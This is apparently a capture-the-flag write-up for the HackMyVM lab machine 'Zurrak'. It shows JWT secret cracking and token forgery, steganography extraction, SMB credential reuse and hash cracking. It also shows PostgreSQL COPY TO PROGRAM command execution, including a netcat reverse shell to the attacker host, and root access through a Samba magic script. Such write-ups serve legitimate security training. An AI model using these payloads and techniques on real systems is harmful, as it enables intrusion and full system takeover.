# Zurrak

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.141:80
Open 10.0.2.141:139
Open 10.0.2.141:445
Open 10.0.2.141:5432
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.141
PORT     STATE SERVICE     REASON  VERSION
80/tcp   open  http        syn-ack Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
| http-title: Login Page
|_Requested resource was login.php
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
139/tcp  open  netbios-ssn syn-ack Samba smbd 4
445/tcp  open  netbios-ssn syn-ack Samba smbd 4
5432/tcp open  postgresql  syn-ack PostgreSQL DB 15.2 - 15.4
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=zurrak
| Subject Alternative Name: DNS:zurrak
| Issuer: commonName=zurrak
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-20T19:29:16
| Not valid after:  2033-10-17T19:29:16
| MD5:   2c24:bdb8:b7d7:8fa8:51f0:1be2:2625:3a9d
| SHA-1: 086e:bf83:1204:d0ef:0230:4290:8a92:b641:d3f4:ceaf
| -----BEGIN CERTIFICATE-----
| MIIC7zCCAdegAwIBAgIUTdKMVheATMcefGITp05Zwlj8vsgwDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGenVycmFrMB4XDTIzMTAyMDE5MjkxNloXDTMzMTAxNzE5
| MjkxNlowETEPMA0GA1UEAwwGenVycmFrMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEA1mhNG6o60cGsrq4iA6Tw2S6IDWRmx6PBz7V8e137c29wNuxu/NSe
| Xr8LWR6lbjI1SJFnn380kI+QoXpUx2dGc7coHJF+ZXZ8spl0mvPvGPRlc3SaCk5c
| 3O88NOgIfA5rEwHdSdYdzBsmxaifhjibW+CPm9OMKmrhhaxeusfSF0Z2PPQiRF3r
| zqrvYEhcjbGy2MJrQqVRiT17WHp0IxzErIsAaOICbEkWK5cyraG67WIT34SZc/EG
| VTbEGxm3uILog4pVePNP1wrObG1RAnvdePZLYqy4f+SGqSERo+9OmAmP3Wlpo43U
| bZlwu1NCY81LV/T5htm0as6Euqfa7rPfEQIDAQABoz8wPTAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBnp1cnJhazAdBgNVHQ4EFgQUWAXLgNI0sXpXQKbUVFqdGH5EfNAw
| DQYJKoZIhvcNAQELBQADggEBAIAk/vaV6QkjotcEIm7pT1gYZVdngBBoge9WYse9
| suUMhoQvXjep6MoLG8wCPcNNw9GpCSQrzOuxfiovhk0WfLnRDJ9XdyL0GTt3lELh
| kdIdeJUZh4MrhjyCrzASQlbQkfrMhiOOhIedtrfb1I9XSFZqFTjYRjsYRBFRc6Mc
| oTkR3KurLUg8cqYLa5f7j9TLpgGIfNlUfvw7WyrSX0sIL2I5kMHwLP1ayWHVspXr
| lq6PWoN6UVW4+NKNok7ty3CxOvVUabAlTiqkRRK3Hxr5e7y+oCIjfrYSQyl3JrRH
| zHHGJB6H9nMbKafvqiBpdg8QL/Fp2mvTalwfRKP8QEhRZeY=
|_-----END CERTIFICATE-----

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 20368/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 2683/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 45022/udp): CLEAN (Timeout)
|   Check 4 (port 48132/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-12-13T14:02:32
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 0s
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/zurrak/writeup.png)

::: info Note
`internal@zurrak.htb:testsite`
:::

Page is empty, but we get a cookie which is a JWT Token

![writeup-1.png](/assets/pentest/hackmyvm/zurrak/writeup-1.png)

```bash
└─$ alias jwt_tool
jwt_tool='docker run -it --network "host" --rm -v "/usr/share/seclists/Passwords/Leaked-Databases:/wordlists" -v "/home/woyag/.jwt_tool:/root/.jwt_tool" -v "/home/woyag/Desktop/Rooms/HackMyVM/Zurrak:/data" ticarpi/jwt_tool'
# ---
└─$ jwt_tool 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJlbWFpbCI6ImludGVybmFsQHp1cnJhay5odGIiLCJpc0FkbWluIjpmYWxzZSwiaWF0IjoxMzU2OTk5NTI0LCJuYmYiOjEzNTcwMDAwMDB9.ufkwBsusc4IEYCCRszCbcSEv6irCtUSx-Uq08OThxso' -C -d /wordlists/rockyou.txt
[*] Tested 1 million passwords so far
[*] Tested 2 million passwords so far
[+] TEST123 is the CORRECT key!
You can tamper/fuzz the token contents (-T/-I) and sign it using:
python3 jwt_tool.py [options here] -S hs256 -p "TEST123"
```

```bash
└─$ jwt_tool 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJlbWFpbCI6ImludGVybmFsQHp1cnJhay5odGIiLCJpc0FkbWluIjpmYWxzZSwiaWF0IjoxMzU2OTk5NTI0LCJuYmYiOjEzNTcwMDAwMDB9.ufkwBsusc4IEYCCRszCbcSEv6irCtUSx-Uq08OThxso' -S hs256 -p TEST123 -I -pc isAdmin -pv True
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJlbWFpbCI6ImludGVybmFsQHp1cnJhay5odGIiLCJpc0FkbWluIjp0cnVlLCJpYXQiOjEzNTY5OTk1MjQsIm5iZiI6MTM1NzAwMDAwMH0.gBpFlpNfVUBlv9HuqXqVzRtaHR265PFagumX_OAKCMY
```

Update token and visit `/admin.php` (Leaked from HTML comments)

![writeup-2.png](/assets/pentest/hackmyvm/zurrak/writeup-2.png)

```bash
└─$ curl -LOs http://10.0.2.141/zurrakhorse.jpg
└─$ curl -LOs http://10.0.2.141/zurraksnake.jpg
└─$ curl -LOs http://10.0.2.141/zurrakhearts.jpg

└─$ stegseek zurrakhorse.jpg $rockyou
[!] error: Could not find a valid passphrase.

└─$ stegseek zurraksnake.jpg $rockyou
[!] error: Could not find a valid passphrase.

└─$ stegseek zurrakhearts.jpg $rockyou
[i] Found passphrase: ""

[i] Original filename: "asli.exe".
[i] Extracting to "zurrakhearts.jpg.out".

└─$ file zurrakhearts.jpg.out
zurrakhearts.jpg.out: PE32+ executable for MS Windows 5.02 (console), x86-64, 19 sections
```

- [https://dogbolt.org/?id=061187ba-1a58-4db7-a15d-3b4edb894aad#Hex-Rays=459](https://dogbolt.org/?id=061187ba-1a58-4db7-a15d-3b4edb894aad#Hex-Rays=459)

![writeup-3.png](/assets/pentest/hackmyvm/zurrak/writeup-3.png)

```bash
>>> print('i\x6c\x6f\x76\x65' + chr(99) + '\x61\x74\x73')
ilovecats
```

## SMB

We can't list shares, however from `admin.php` share name was leaked
```bash
└─$ netexec smb zurrak.htb -u 'asli' -p 'ilovecats' --shares
SMB         10.0.2.141      445    ZURRAK           [*] Unix - Samba (name:ZURRAK) (domain:ZURRAK) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.141      445    ZURRAK           [+] ZURRAK\asli:ilovecats
SMB         10.0.2.141      445    ZURRAK           [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

Connect
```bash
└─$ impacket-smbclient ''/'asli':'ilovecats'@'zurrak.htb'
# use share
# ls
drw-rw-rw-          0  Fri Oct 20 17:14:00 2023 .
drw-rw-rw-          0  Fri Oct 20 16:36:51 2023 ..
drw-rw-rw-          0  Fri Oct 20 23:44:43 2023 DONTDELETE
drw-rw-rw-          0  Sat Oct 21 00:04:29 2023 operations
-rw-rw-rw-       1792  Sun Jul 24 01:30:08 2011 backup.reg
drw-rw-rw-          0  Sun Apr  2 01:30:08 2017 human_resources
-rw-rw-rw-         21  Tue Dec 13 22:55:15 2022 launch_options.txt

# tree
/backup.reg
/DONTDELETE/eric
/DONTDELETE/eric/190709234911.BMP
/DONTDELETE/eric/190709234924.BMP
/DONTDELETE/eric/190709234935.BMP
/DONTDELETE/eric/bios
/DONTDELETE/eric/biosoc
/DONTDELETE/eric/biosoc2
/DONTDELETE/eric/New Text Document.txt
/DONTDELETE/New folder
/human_resources/employees.csv
/human_resources/status.txt
/launch_options.txt
/operations/binaries
/operations/binaries/LAPS.x64.msi
/operations/binaries/python-3.12.0-amd64.exe
/operations/binaries/WinSCP-6.1.1-Setup.exe
/operations/New folder
/operations/New folder/deploy
/operations/New folder/deploy/1
/operations/New folder/deploy/1/approved
/operations/New folder/deploy/1/declined
/operations/New folder/deploy/1/read.txt
/operations/New folder/deploy/2
/operations/New folder/deploy/2/approved
/operations/New folder/deploy/2/declined
/operations/New folder/deploy/2/read.txt
/operations/New folder/deploy/3
/operations/New folder/deploy/3/latest
/operations/New folder/deploy/3/latest/approved
/operations/New folder/deploy/3/latest/approved/zurrak.old.vmdk
/operations/New folder/deploy/3/latest/declined
/operations/New folder/deploy/4
/operations/New folder/deploy/4/approved
/operations/New folder/deploy/4/declined
/operations/New folder/deploy/4/read.txt
/operations/operators.txt
Finished - 38 files and folders
```

```bash
# cat operators.txt
emir:Tlyu4#f
john:O0p12Az
freddie:KAsz241
albert:Lqak25r4

please change your credentials after reaching endpoint
```

Invalid creds and since it says `Guest` most probably no users with such username.
```bash
└─$ netexec smb zurrak.htb -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
SMB         10.0.2.141      445    ZURRAK           [*] Unix - Samba (name:ZURRAK) (domain:ZURRAK) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.141      445    ZURRAK           [+] ZURRAK\emir:Tlyu4#f (Guest)
SMB         10.0.2.141      445    ZURRAK           [+] ZURRAK\john:O0p12Az (Guest)
SMB         10.0.2.141      445    ZURRAK           [+] ZURRAK\freddie:KAsz241 (Guest)
SMB         10.0.2.141      445    ZURRAK           [+] ZURRAK\albert:Lqak25r4 (Guest)
```

Download everything for easier enumeration
```bash
└─$ smbclient -U 'asli'%'ilovecats' //10.0.2.141/share
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
smb: \> exit
└─$ find . -empty -delete
```

There's also `.vmdk` file, I used FTP Imager to analyze it.

System has postgres user and `shadow` is readable

![writeup-4.png](/assets/pentest/hackmyvm/zurrak/writeup-4.png)

```powershell
➜ notepad C:\Users\Public\hashes.txt
postgres:$6$ZaTjsuy0$rBmhDDcT45A.p6chCl53MNn3c3k2lKjSn5sneyxOxaVpozADMVScztCYmdyexb4Gy7IvwlbBwzvRd.krKqT1L/
➜ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
baller15         (postgres)
```

## Postgres

- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution)

```bash
└─$ PGPASSWORD='baller15' psql -U postgres -h zurrak.htb
postgres=# \list
                                                     List of databases
   Name    |  Owner   | Encoding | Locale Provider |   Collate   |    Ctype    | Locale | ICU Rules |   Access privileges
-----------+----------+----------+-----------------+-------------+-------------+--------+-----------+-----------------------
 postgres  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           |
 template0 | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           | =c/postgres          +
           |          |          |                 |             |             |        |           | postgres=CTc/postgres
 template1 | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           | =c/postgres          +
           |          |          |                 |             |             |        |           | postgres=CTc/postgres

postgres=# use postgres
postgres=# COPY (SELECT '') to PROGRAM 'wget 10.0.2.15';
COPY 1
---
└─$ serve
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.0.2.141 - - [13/Dec/2025 10:00:46] "GET / HTTP/1.1" 200 -
```

RCE is successful as postgres

```bash
postgres=# COPY (SELECT '') to PROGRAM 'busybox nc 10.0.2.15 4444 -e /bin/bash';
---
└─$ penelope -p 4444
postgres@zurrak:/var/lib/postgresql/15/main$ id
uid=101(postgres) gid=110(postgres) groups=110(postgres),109(ssl-cert)
```

### User.txt

```bash
postgres@zurrak:/home/postgres$ cat user.txt
fe8f97f109ceb0362c95e60338c4c1a8
```

## Privilege Esacalation

```bash
postgres@zurrak:/home/postgres$ cat emergency.sh
echo "root:1234" | chpasswd
```

```bash
postgres@zurrak:/home/postgres$ grep emergency.sh /etc -Rain 2>/dev/null
/etc/samba/smb.conf:264:magic script = emergency.sh
```

```bash
[ipc$]
hosts allow = 127.0.0.1
hosts deny = 0.0.0.0/0
guest ok = no
browseable = no

[share]
comment = "zurrak operations share"
path = /opt/smbshare
hosts allow = 0.0.0.0/0
guest ok = no
browseable = yes
writable = no
valid users = emre, asli

[internal]
comment = "zurrak internal share"
path = /opt/internal
hosts allow = 127.0.0.1
guest ok = no
browseable = yes
writable = yes
valid users = emre
create mask = 0777
directory mask = 0777
force user = root
magic script = emergency.sh
```

```bash
postgres@zurrak:/home/postgres$ grep /internal /etc -Rn --color=auto 2>/dev/null
/etc/samba/smb.conf:255:path = /opt/internal
/etc/fstab:18://127.0.0.1/internal      uid=emre, pw=daily666
/etc/apparmor.d/samba/smbd-shares:5:"/opt/internal/"   rk,
/etc/apparmor.d/samba/smbd-shares:6:"/opt/internal/**" rwkl,
/etc/php/8.2/apache2/php.ini:726:; https://php.net/internal-encoding
/etc/php/8.2/cli/php.ini:726:; https://php.net/internal-encoding
```

We can only connect to share from internal network, share is empty so what now?
```bash
postgres@zurrak:/tmp$ smbclient -U 'emre'%'daily666' //127.0.0.1/internal
smb: \> ls
  .                                   D        0  Sat Dec 13 10:14:04 2025
  ..                                  D        0  Fri Oct 20 16:36:51 2023

                9232860 blocks of size 1024. 6248932 blocks available
```

- [https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html#MAGICSCRIPT](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html#MAGICSCRIPT)
	- This parameter specifies the name of a file which, if opened, will be executed by the server when the file is closed. This allows a UNIX script to be sent to the Samba host and executed on behalf of the connected user.
	- Scripts executed in this way will be deleted upon completion assuming that the user has the appropriate level of privilege and the file permissions allow the deletion.

```bash
postgres@zurrak:/home/postgres$ smbclient -U 'emre'%'daily666' //127.0.0.1/internal
Try "help" to get a list of possible commands.
smb: \> put emergency.sh
putting file emergency.sh as \emergency.sh (0.3 kb/s) (average 0.3 kb/s)
```

Success
```bash
postgres@zurrak:/home/postgres$ timeout 1 echo 1234 | su - root -c id
Password: uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@zurrak:/home/postgres# cat /root/root.txt
66fce7650a88ac2afd99d061e1c6a4df
```